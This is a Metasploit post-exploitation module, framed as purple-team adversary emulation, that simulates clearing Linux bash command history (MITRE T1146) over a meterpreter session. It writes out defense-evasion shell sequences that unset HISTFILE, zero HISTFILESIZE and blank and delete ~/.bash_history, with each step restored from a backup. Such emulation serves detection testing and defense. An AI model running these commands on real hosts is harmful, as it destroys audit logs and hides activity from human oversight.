##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

include Msf::Post::File
include Msf::Post::Linux::Priv
include Msf::Post::Linux::System

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Clear Command History (T1146) Linux - Purple Team',
                      'Description'   => %q{
                        Defense Evasion:
                        macOS and Linux both keep track of the commands users type in their
                        terminal so that users can easily remember what they've done. These
                        logs can be accessed in a few different ways. While logged in, this
                        command history is tracked in a file pointed to by the environment
                        variable HISTFILE. When a user logs off a system, this information
                        is flushed to a file in the user's home directory called ~/.bash_history.
                        The benefit of this is that it allows users to go back to commands
                        they've used before in different sessions. Since everything typed on
                        the command-line is saved, passwords passed in on the command line are
                        also saved. Adversaries can abuse this by searching these files for
                        cleartext passwords. Additionally, adversaries can use a variety of
                        methods to prevent their own commands from appear in these logs such as
                        unset HISTFILE, export HISTFILESIZE=0, history -c, rm ~/.bash_history.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'Platform'      => [ 'linux' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1146'] ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
  end

  def run
    return 0 if session.type != "meterpreter"

    cmds = []

    cmds += ["
    export HISTFILE='/root/.bash_history'
    HISTFILEBAK=$HISTFILE
    unset HISTFILE
    export HISTFILE=$HISTFILEBAK
    unset HISTFILEBAK
    "]

    cmds += ["
    export HISTFILE='/root/.bash_history'
    HISTFILESIZEBAK=$HISTFILESIZE
    export HISTFILESIZE=0
    HISTFILESIZE=$HISTFILESIZEBAK
    export HISTFILESIZE=$HISTFILESIZEBAK
    unset HISTFILESIZEBAK
    "]

    cmds += ["
    cp ~/.bash_history /tmp/.bash_historybak
    echo "" > ~/.bash_history
    rm -f ~/.bash_history
    mv /tmp/.bash_historybak ~/.bash_history
    "]
    cmds.each do |cmd|
      begin
        print_status("Executing command #{cmd}...")
        print_good(cmd_exec(cmd))
      rescue ::Exception => e
        print_error("Error running command #{cmd}: #{e.class} #{e}")
      end
    end
  end
end

